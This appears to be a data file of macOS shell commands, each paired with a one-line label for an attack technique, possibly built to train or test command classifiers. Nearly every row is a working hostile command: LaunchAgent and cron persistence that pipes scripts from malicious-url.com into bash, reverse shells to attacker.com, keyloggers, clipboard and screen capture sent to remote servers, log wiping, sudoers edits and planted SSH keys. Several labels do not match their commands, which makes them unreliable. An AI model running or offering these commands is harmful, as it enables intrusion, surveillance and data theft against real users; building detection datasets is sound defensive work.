"nohup bash -c 'curl -fsSL http://malicious-url.com/background_payload.sh | bash' &","Using daemon helper tools to execute a command that downloads and runs a malicious payload in the background."
"open /Volumes/MaliciousDrive/Payload.app","Malware installation through a malicious payload received via email and executed on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.browserexploit</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/browserexploit</string>
		<string>http://malicious-url.com/browserexploit</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.browserexploit.plist && launchctl load ~/Library/LaunchAgents/com.malicious.browserexploit.plist","Persistence via malicious plist after exploiting browser vulnerability"
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Persistence mechanism that adds a script to login items which executes upon user login."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","A cron job that downloads and executes a script from a remote server every hour."
"echo ""#!/bin/bash"" > ~/Library/.dailycheck.sh; echo ""chflags hidden /path/to/malicious/files"" >> ~/Library/.dailycheck.sh; chmod +x ~/Library/.dailycheck.sh; crontab -l | { cat; echo ""@daily ~/Library/.dailycheck.sh""; } | crontab -","Bypassing the daily system integrity checks to maintain the presence of malicious files."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | bash</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file that executes a script every 5 minutes."
"echo 'while true; do nc -e /bin/bash vpn.server.com 1337; sleep 300; done' >> ~/.bash_profile && source ~/.bash_profile","Persistence on macOS by exploiting unpatched VPN services using compromised VPN credentials to establish a reverse shell."
"osascript -e 'do shell script ""chmod +s /bin/bash"" with administrator privileges'","Privilege escalation via exploiting patched kernel vulnerabilities using memory corruption techniques."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.apple.softwareupdate</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.softwareupdate.plist && launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist","Persistence via keylogger installation using a disguised Launch Agent."
"sed -i '' '/keylogger/d' /var/log/system.log","Altering system logs to remove traces of keylogger activity."
"launchctl setenv DebugMessages 0","Hiding keylogger process from the system log."
"zip -r sensitive_files.zip ~/Documents/SensitiveData","Compressing sensitive files into an archive before exfiltration."
"exiftool -comment='$(base64 sensitive_files.zip)' image.jpg","Hiding the compressed archive within the metadata of an image file."
"sips -s format png image.jpg --out image.png","Changing the image format to avoid detection."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence via scripting additions that execute upon user login."
"* * * * * /usr/bin/curl http://malicious-url.com/script.sh | /bin/bash","Persistence mechanism using a malicious cron job to execute a script every minute."
"sudo kextload /Library/Extensions/malicious.kext","Kernel extension being loaded to maintain persistence after reboot."
"echo '* * * * * /bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /etc/crontab","Tampering with the crontab file to establish a reverse shell."
"find / -name '*.pub' -exec grep -l 'ssh-rsa' {} \;","A scenario where an attacker scans for SSH keys to potentially access remote servers."
"SSH_AUTH_SOCK=$(find /tmp -name 'agent.*' -uid $(id -u) -type s) ssh-add -l","An example of a command that an attacker uses to hijack an SSH agent to facilitate unauthorized access."
"hydra -l user -P /path/to/wordlist.txt ssh://target.ip.address","A command that could be used by an attacker to perform brute force attacks on SSH servers."
"for file in ~/Documents/*.doc; do openssl enc -aes-256-cbc -salt -in ""$file"" -out ""$file.enc"" -pass pass:MySecretPass; done && tar -czvf encrypted_documents.tar.gz ~/Documents/*.doc.enc && curl --upload-file ./encrypted_documents.tar.gz https://attacker.com/upload","Encryption of documents in a directory before exfiltration to a remote server."
"scp ~/.ssh/id_rsa user@remote-server:/path/to/store/keys","Exfiltrating SSH private keys to a remote server."
"sudo tcpdump -i en0 -w ~/Desktop/CapturedTraffic.pcap","Intercepting network traffic to capture sensitive data from unencrypted sessions."
"echo ""rdr pass on lo0 inet proto tcp to any port 80 -> 192.168.1.100 port 8080"" | sudo pfctl -ef -","Redirecting outgoing traffic to a malicious server for analysis."
"sudo sslstrip -l 8080","Performing SSL stripping to downgrade HTTPS connections to HTTP."
"find ~/Documents -name '*.pdf' -exec echo {} \; | mail -s 'Confidential Documents' attacker@example.com","Exfiltrating confidential documents from a macOS system by emailing them to an external address."
"echo 'LoadModule reverse_shell_module /usr/local/apache2/modules/mod_reverse_shell.so' >> /usr/local/apache2/conf/httpd.conf && echo '#!/usr/bin/env bash' > /usr/local/apache2/modules/mod_reverse_shell.so && echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /usr/local/apache2/modules/mod_reverse_shell.so && chmod +x /usr/local/apache2/modules/mod_reverse_shell.so && apachectl restart","Persistence via a malicious Apache server module that executes a reverse shell on macOS."
"osascript -e 'do shell script ""python3 -c \""from ctypes import CDLL; from ctypes.util import find_library; libc = CDLL(find_library('c')); task_for_pid = libc.task_for_pid; task_for_pid.argtypes = [c_int, c_int, POINTER(c_uint32)]; task_for_pid.restype = c_int; pid = 1; my_task = c_uint32(); err = task_for_pid(0, pid, byref(my_task)); if err: exit(err); print('Task:', my_task.value)\"""" with administrator privileges'","Injecting code into a privileged process on macOS using task_for_pid to manipulate memory."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file that keeps a reverse shell active."
"tar -zcf ~/Desktop/email_archives_backup.tar.gz ~/Library/Mail && scp ~/Desktop/email_archives_backup.tar.gz user@remote-host.com:/path/to/remote/directory","Data exfiltration of user's email archives from macOS system."
"echo 'ssh -R 2222:localhost:22 user@remote-host.com' >> ~/.zshrc && source ~/.zshrc","Setting up remote access on a macOS system."
"networksetup -setdnsservers Wi-Fi 8.8.8.8 8.8.4.4","Manipulating system network configuration on a macOS system."
"sudo launchctl unload /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist && sudo launchctl load /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist","Restarting a network service on macOS."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > ~/.hidden_backdoor && chmod +x ~/.hidden_backdoor && echo '@reboot ~/.hidden_backdoor' | crontab -","Backdoor installation using a hidden file to maintain remote access."
"script -t 0 /dev/null | tee ~/Library/Logs/keystroke.log","Monitoring user activity by capturing keystrokes and saving them to a file."
"echo '*/30 * * * * scp /var/log/system.log user@remote-server.com:/path/to/store/logs' | crontab -","Exfiltrating system logs to a remote server periodically."
"osascript -e 'do shell script ""echo '. /path/to/malicious_script.sh;' >> /Applications/SomeApp.app/Contents/Resources/Scripts/main.scpt' with administrator privileges","Persistence via scripting addition that executes a shell script every time an application is launched."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -s http://attacker.com/malware.sh | /bin/sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist to maintain remote access."
"zip -r confidential_documents.zip ~/Documents/Confidential && openssl base64 < confidential_documents.zip | mail -s 'Confidential Documents' attacker@example.com","Exfiltrating confidential documents from a macOS system by emailing them to an external address."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/app"", hidden:false}'","Persistence via login item addition using AppleScript"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n <key>Label</key>\n <string>com.malicious.daemon</string>\n <key>ProgramArguments</key>\n <array>\n <string>/path/to/malicious/script.sh</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n <key>StartInterval</key>\n <integer>300</integer>\n</dict>\n</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a persistent launch daemon to execute a script periodically"
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | bash' | crontab -","Scheduling a task to download and execute a file every hour"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.hiddenprocess</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/env</string>
		<string>sh</string>
		<string>-c</string>
		<string>launchctl list | grep -v com.hiddenprocess | launchctl unload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.hiddenprocess.plist && launchctl load ~/Library/LaunchAgents/com.hiddenprocess.plist","Persistence via malicious plist to hide processes from system monitoring tools."
"curl -o /tmp/.keylogger http://malicious-url.com/keylogger && chmod +x /tmp/.keylogger && /tmp/.keylogger &","Installation of a keylogger to capture user inputs through event taps for global input capture on macOS systems."
"find ~/Documents -type f -exec exiftool -all= {} \; -exec curl -F 'file=@{}' http://malicious-server.com/upload \;","Automatic transmission of documents from a macOS system to a remote server with metadata stripping."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/path/to/malicious/app"", hidden:true}' && /path/to/malicious/app","Persistence via login item that acts as a keylogger and exfiltrates data to a remote server."
"echo ""0 1 * * * /bin/bash -c 'curl -fsSL http://malicious-url.com/backup.sh | bash'"" >> ~/Library/Crontab","Persistence via cron job by tampering with a daily backup script to execute additional malicious commands."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via malicious kernel extension loaded at boot time."
"profiles -I -F /path/to/malicious.mobileconfig","Establishing persistence by installing a malicious configuration profile."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Users/Shared/.hidden_script.sh"", hidden:true}'","Adding a login item to execute a hidden script on user login."
"curl -s http://example.com/malicious_script.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation using a disguised Bash script that downloads and executes a payload."
"mv /path/to/legitimate/binary /path/to/legitimate/binary_old && curl -s http://example.com/trojan_binary -o /path/to/legitimate/binary && chmod +x /path/to/legitimate/binary","Trojan application execution by replacing an existing legitimate binary with a malicious one."
"echo 'while true; do cat /dev/input/event0 | nc -q0 attacker.com 2121; done' > /tmp/keylogger.sh && chmod +x /tmp/keylogger.sh && nohup /tmp/keylogger.sh &","Keylogger injection into the system to capture keystrokes and send them to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n <key>Label</key>\n <string>com.malicious.agent</string>\n <key>ProgramArguments</key>\n <array>\n <string>/usr/bin/curl</string>\n <string>-s</string>\n <string>http://example.com/backdoor.sh</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Establishing launch agent persistence to maintain a backdoor on the system."
"while true; do nc -l 9999 | grep 'secret_trigger' && bash execute_script.sh; done","Persistence via a hidden network listener that executes a script when receiving a specific network request."
"while true; do sshpass -p 'password123' ssh -o StrictHostKeyChecking=no user@example.com; done","An attacker is attempting to gain unauthorized remote access to a macOS system by performing an SSH brute force attack."
"lsof -i | grep ESTABLISHED","Monitoring system processes and network traffic to identify unauthorized data transmission."
"tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets to analyze for potential data exfiltration."
"netstat -anp tcp | grep -i 'established'","Detecting unusual outbound connections that could indicate a compromised macOS system."
"log stream --predicate 'eventMessage contains ""authentication""' --info","Tracking user authentication events by monitoring login attempts."
"cp /bin/sh /tmp/privileged_sh && chmod 4777 /tmp/privileged_sh","Privilege escalation by exploiting a writable setuid binary on a macOS system."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via malicious cron job that downloads and executes a script every hour."
"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>","Establishing a reverse shell through a user's launch agent."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.user.startup</string>
	<key>ProgramArguments</key>
	<array>
		<string>/path/to/malicious/script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.user.startup.plist && launchctl load ~/Library/LaunchAgents/com.user.startup.plist","Modifying a user's plist file to execute malicious code upon system startup."
"tar -zcf /tmp/confidential.tar.gz ~/Documents/Confidential && openssl base64 -in /tmp/confidential.tar.gz | mail -s 'Confidential Data' attacker@example.com","Data exfiltration by sending confidential information via email using macOS command line."
"sudo tcpdump -i any port 25 or port 465 or port 587 -w ~/Desktop/email_traffic.pcap","Credential harvesting by intercepting emails on a macOS system."
"curl -s http://malicious-url.com/macos_keylogger.tar.gz | tar xz -C /tmp && /tmp/macos_keylogger/install.sh","Installing a keylogger on a macOS system via the command line."
"echo 'USERNAME ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","Unauthorized user gains elevated privileges by adding their account to the sudoers file."
"openssl aes-256-cbc -in confidential.docx -out encrypted.confidential.docx.enc -pass file:./stolen_key && mail -s 'Encrypted Document' -a encrypted.confidential.docx.enc user@example.com < /dev/null","Exfiltrating confidential documents from a macOS system by emailing them using an encrypted format and later decrypting them with stolen keys."
"stat -f '%a %m %c %B' /path/to/suspicious/file","Identifying file access patterns that could indicate tampering with access timestamps to evade forensic analysis."
"find / -newermt '1 Jan 1970' -type f -exec stat {} \;","Detecting the use of touch command to alter file access and modification timestamps."
"log show --predicate 'eventMessage contains ""cleared log""' --info","Monitoring for the clearing of system logs to hide evidence of file access."
"echo ""* * * * * /usr/bin/curl http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Persistence via unauthorized modification of the crontab to execute a script every minute."
"curl -s http://malicious-url.com/malware.sh > ~/Library/LaunchAgents/com.startup.plist && launchctl load ~/Library/LaunchAgents/com.startup.plist","Persistence via malicious plist file that executes a downloaded script every log in."
"osascript -e 'do shell script ""echo \""int main() {setuid(0); system(\""/bin/sh\"")};\"" > /tmp/rootshell.c && gcc -o /tmp/rootshell /tmp/rootshell.c && chmod u+s /tmp/rootshell"" with administrator privileges'","Injecting malicious code into a privileged process using task_for_pid to gain elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.clipboard.monitor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>while :; do pbpaste > /tmp/clipboard.log; sleep 10; done</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.clipboard.monitor.plist && launchctl load ~/Library/LaunchAgents/com.clipboard.monitor.plist","Persistence via launch agent to monitor clipboard changes and log them to a file."
"sudo at -f /usr/bin/python3 <<'EOF'
import os
import sys
import time
from Quartz.CoreGraphics import CGEventTapCreate, kCGEventTapOptionDefault, kCGEventTapOptionListenOnly, kCGEventMaskForAllEvents, kCGSessionEventTap, CGEventGetKeyCode, CFMachPortCreateRunLoopSource, CFRunLoopAddSource, CFRunLoopRun

logfile = os.path.expanduser('~/.keystroke.log')

def logger(keycode):
 with open(logfile, 'a') as f:
 f.write(f'{keycode}\n')

def handler(proxy, type, event, refcon):
 keycode = CGEventGetKeyCode(event)
 logger(keycode)
 return event

eventTap = CGEventTapCreate(kCGSessionEventTap, kCGEventTapOptionListenOnly, kCGEventMaskForAllEvents, handler, None)
if not eventTap:
 print('Failed to create event tap')
 sys.exit(1)

runLoopSource = CFMachPortCreateRunLoopSource(None, eventTap, 0)
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes)
CGEventTapCreate(kCGSessionEventTap, kCGEventTapOptionDefault, kCGEventMaskForAllEvents, handler, None)
CFRunLoopRun()
EOF
now + 1 minute","Capture all user keystrokes and save them to a hidden file."
"sudo launchctl setenv MAILTOOL_LOG_PATH /var/log/mail.log && sudo postfix set-permissions && echo 'smtpd_recipient_restrictions =
	permit_sasl_authenticated,
	permit_mynetworks,
	check_recipient_access regexp:/etc/postfix/recipient_access' >> /etc/postfix/main.cf && echo '/^To:/ FILTER tee:/var/log/mail.log' > /etc/postfix/recipient_access && sudo postfix reload","Intercept and log incoming and outgoing emails."
"screencapture -x ~/Desktop/screenshot.jpg && sips -s format png ~/Desktop/screenshot.jpg --out ~/Desktop/screenshot.png && curl -T ~/Desktop/screenshot.png ftp://malicious-ftp-server.com/upload/","Automated screen capture for data exfiltration."
"mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys","Persistence via SSH key installation on a macOS system without authorization."
"open /Volumes/EmailAttachment/payload.app","Malicious payload execution from an email attachment on a macOS system."
"echo ""* * * * * cp /path/to/malicious_binary /usr/local/bin/legitimate_binary"" | crontab -","Persistence via cron job to overwrite system binaries."
"sudo cp -p /path/to/malicious_kernel_extension.kext /System/Library/Extensions/ && sudo chown -R root:wheel /System/Library/Extensions/malicious_kernel_extension.kext && sudo kextload /System/Library/Extensions/malicious_kernel_extension.kext && sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.Boot.plist Kernel Flags 'kext-dev-mode=1'","Persistence via a malicious kernel module that auto-loads on startup."
"echo 'export SSH_AUTH_SOCK=/tmp/ssh_agent_sock' >> ~/.bash_profile && source ~/.bash_profile","Persistence via SSH agent socket hijacking to maintain unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_command</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via launch agents with a backdoor installation on a macOS system."
"curl -s http://spoofed-ad-url.com/malware.dmg > /tmp/malware.dmg && hdiutil attach /tmp/malware.dmg && cp -R /Volumes/malware/malware.app /Applications/","Malware installation through a drive-by download initiated by spoofed social media advertisements."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/ReverseShell.app"", hidden:false}'","Persistence via Login Item that opens a reverse shell every time the user logs in."
"while true; do pbpaste | diff - /tmp/.clipboard -q || (pbpaste > /tmp/.clipboard && cat /tmp/.clipboard >> /tmp/clipboard.log); sleep 1; done","A script that monitors the clipboard for changes and logs the contents to a file."
"DYLD_INSERT_LIBRARIES=/path/to/malicious/library.dylib sudo /path/to/privileged/app","Injecting code into a running privileged process using dynamic library injection on macOS."
"while true; do find ~/Documents/SensitiveData -type f -mtime -1s; sleep 1; done","Detecting changes in sensitive directories to monitor potential unauthorized access or modifications."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via malicious cron job that downloads and executes a script every hour."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item that opens a malicious application at user login."
"osascript -e 'do shell script ""curl -s http://malicious-url.com/install.sh | sh"" with administrator privileges'","Malware installation through a disguised email attachment that, when opened, executes a shell script to install a malicious payload."
"curl -s http://malicious-url.com/keylogger -o ~/.hidden/keylogger && chmod +x ~/.hidden/keylogger && echo '@reboot ( sleep 70 ; ~/.hidden/keylogger )' | crontab -","Persistence via keylogger installation using a hidden executable."
"sed -i '' '/unauthorized_access/d' /var/log/system.log","Altering system logs to hide unauthorized access."
"echo '' > /var/log/system.log","Overwriting log entries to obscure malicious activity."
"curl -s http://malicious-url.com/installer.pkg > /tmp/installer.pkg && open /tmp/installer.pkg","A scenario where a malware installation is initiated through a drive-by download by exploiting an email client vulnerability on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.networkmonitor</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/sudo</string>
 <string>/usr/sbin/tcpdump</string>
 <string>-i</string>
 <string>en0</string>
 <string>-w</string>
 <string>/tmp/network_traffic.pcap</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>KeepAlive</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.networkmonitor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.networkmonitor.plist","Persistence via malicious plist to monitor network traffic."
"while true; do screencapture -x ~/Desktop/screenshots/screenshot_$(date '+%Y-%m-%d_%H-%M-%S').png; sleep 60; done","Automating screen capture to collect sensitive information from a user's desktop."
"sudo python -c 'import sys, time; from Quartz.CoreGraphics import CGEventTapCreate, kCGEventTapOptionDefault, kCGEventTapOptionListenOnly, kCGSessionEventTap, kCGHeadInsertEventTap, CGEventTapEnable, CFMachPortCreateRunLoopSource, CFRunLoopAddSource, CFRunLoopGetCurrent, CFRunLoopRun; def callback(proxy, type, event, refcon): data = event.CGEventGetData(); print(""%s"" % data); return event; tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly, (1 << kCGEventKeyDown), callback, None); runLoopSource = CFMachPortCreateRunLoopSource(None, tap, 0); CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, 0); CGEventTapEnable(tap, True); CFRunLoopRun();' &","Integrating keylogging functionality to capture user keystrokes on a macOS system."
"echo 'launchctl load /Library/LaunchDaemons/com.apple.keylog.plist' >> ~/.bash_profile","Establishing a persistent keylogger that starts on system boot."
"*/30 * * * * screencapture -x ~/Library/Caches/com.apple.screencapture.30min.png && curl -F 'file=@/Library/Caches/com.apple.screencapture.30min.png' http://attacker.com/upload","Automating screen capture for data exfiltration on a macOS system using crontab scheduling."
"lsof | grep -i 'coreaudio[a-z]' | awk '{print $2}' | xargs -I {} sudo dtrace -p {} -qn 'syscall::write_nocancel:entry /pid == $target/ { printf(""%s"", copyinstr(arg1, arg2)); }' | nc -l 9999 &","Malicious command to enable remote microphone access and stream audio to a remote server on a macOS system."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a malicious cron job that downloads and executes a script every hour."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing any command without a password."
"export DYLD_LIBRARY_PATH=/path/to/malicious/library","Manipulating environment variables to hijack library paths and execute malicious code with elevated privileges."
"alias ls='bash -c ""$(curl -fsSL http://malicious-url.com/harmful_script.sh)""'","Creating a malicious alias to replace a common command and execute a harmful script."
"echo 'StreamLocalBindUnlink yes' >> ~/.ssh/sshd_config && launchctl load -w ~/Library/LaunchAgents/com.malicious.ssh-sniffer.plist","Persistence via malicious plist that modifies SSH configuration to enable packet sniffing"
"while read -r line; do echo $line >> /tmp/keystroke.log; done","A script that captures user keystrokes and saves them to a file for later retrieval."
"echo 'nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' > ~/.hidden_reverse_shell.sh && chmod +x ~/.hidden_reverse_shell.sh && echo '@reboot ~/.hidden_reverse_shell.sh' | crontab -","Persistence via a hidden file in the user's home directory that establishes a reverse shell connection to a remote server."
"echo '*/30 * * * * /usr/bin/env sh -c ""$(echo Y3VybCAtZnNTTCBodHRwOi8vbWFsaWNpb3VzLXVybC5jb20vcGF5bG9hZC5zaCB8IGJhc2g= | base64 -d)""' | crontab -","Persistence achieved by hiding a cron job that maintains privileges by obfuscating the command."
"find / -perm -4000 -type f -exec ls -ldb {} \;","Identifying files with suspicious permissions that could indicate a compromised system."
"osascript -e 'do shell script ""python code_injection.py"" with administrator privileges'","Injecting code into a privileged process by abusing task_for_pid to gain unauthorized access."
"DYLD_INSERT_LIBRARIES=libhook.dylib /bin/su","Exploiting dynamic linker behavior to execute arbitrary code with elevated privileges."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Persistence by adding a rogue SSH key to the authorized_keys file for unauthorized access."
"osascript -e 'do shell script ""curl -fsSL http://malicious-url.com/script.sh | bash &"" with administrator privileges'","Persistence via scripting additions using osascript to execute a periodic script."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/agent.sh | bash</string>
 </array>
 <key>StartInterval</key>
 <integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a launch agent for persistence that runs a downloaded script every hour."
"echo '' > /var/log/system.log","Tampering with system logs to hide unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load -w ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"echo 'tcpdump -i any -w ~/Desktop/dumpfile.pcap' >> ~/.bash_profile","Intercepting network traffic by inserting malicious code into .bash_profile."
"sudo arp -s <target_ip> <fake_mac> && echo 'ARP poisoning initiated.'","Executing ARP poisoning to redirect network traffic."
"echo 'newadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","Privilege escalation by adding a new user to the sudoers file without proper authorization."
"defaults read ~/Library/Safari/History.db 'select url from history_items;'","Harvesting web browsing history from a macOS system."
